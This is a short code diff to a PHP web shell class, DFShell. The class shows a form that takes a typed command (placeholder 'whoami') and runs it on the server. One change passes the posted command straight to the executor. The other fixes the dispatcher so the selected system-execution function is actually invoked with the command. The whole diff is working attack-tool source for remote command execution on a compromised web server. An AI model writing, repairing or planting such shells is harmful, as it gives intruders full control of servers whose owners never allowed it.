@@ -421,8 +421,7 @@ class DFShell{
                 echo "<section id='cmd_area'>";
                 echo "<form action='' method='POST' autocomplete='OFF'><textarea class='cmd_response' readonly='TRUE'>";
                 if(isset($GLOBALS['DFConfig'][1]['dfscmd']) && !empty($GLOBALS['DFConfig'][1]['dfscmd'])){
-                   $getCMD = $GLOBALS['DFConfig'][1]['dfscmd'];
-                   $this->DFSExecute($getCMD);
+                   $this->DFSExecute($GLOBALS['DFConfig'][1]['dfscmd']);
                 }
                 echo "</textarea><br><input type='text' name='dfscmd' placeholder='whoami'><br><button>Execute</button></form>";
                 echo "</section>";
@@ -815,7 +814,7 @@ class DFShell{
             if($availCMD===$GLOBALS['DFSCmd'][4]){
                 return $this->DFSProcOpen($command);
             }else{
-                return $availCMD;
+                return $availCMD($command);
             }
         }
     }
